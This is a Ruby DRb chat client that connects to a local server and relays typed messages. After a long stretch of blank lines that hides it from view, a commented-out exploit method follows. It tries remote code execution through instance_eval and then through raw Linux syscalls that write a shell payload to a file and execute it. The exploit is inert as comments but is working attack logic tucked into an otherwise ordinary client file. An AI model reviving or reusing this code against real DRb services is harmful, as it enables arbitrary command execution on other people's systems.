require 'drb/drb'
require 'ostruct'

class Client
  attr_accessor :name
  include DRbUndumped
  def initialize(name)
    @name=name
  end
  def message(msg)
    puts msg
  end
end

DRb.start_service
remote_connection=DRbObject.new(nil,"druby://localhost:4200")

puts "enter your chat name"
name = gets.chomp
client = Client.new(name)
connection=remote_connection.add_client(client)
loop do
  gets.chomp
  connection.to_server($_)
  if $_ =="bye"
    remote_connection.bye
    break
  end
end



































#def exploit
#  p = Object.new
#  begin
#    puts('trying to exploit instance_eval')
#    p.send(:instance_eval,"Kernel.fork { `ls` }")
#  rescue SecurityError => e
#    print_status('instance eval failed, trying to exploit syscall')
#    filename = "random_random"
#    begin
#      j = p.send(:syscall,20)
#      # syscall open
#      i =  p.send(:syscall,8,filename,0700)
#      # syscall write
#      p.send(:syscall,4,i,"#!/bin/sh\n" << payload.encoded,payload.encoded.length + 10)
#      # syscall close
#      p.send(:syscall,6,i)
#      # syscall fork
#      p.send(:syscall,2)
#      # syscall execve
#      p.send(:syscall,11,filename,0,0)
#
#        # not vulnerable
#    rescue SecurityError => e
#
#      print_status('target is not vulnerable')
#
#        # likely 64bit system
#
#    rescue => e
#      # syscall creat
#      i = p.send(:syscall,85,filename,0700)
#
#      # syscall write
#      p.send(:syscall,1,i,"#!/bin/sh\n" << payload.encoded,payload.encoded.length + 10)
#
#      # syscall close
#      p.send(:syscall,3,i)
#
#      # syscall fork
#      p.send(:syscall,57)
#
#      # syscall execve
#      p.send(:syscall,59,filename,0,0)
#    end
#
#  end
#
#  puts("payload executed from file #{filename}") unless filename.nil?
#  puts("make sure to remove that file") unless filename.nil?
#end
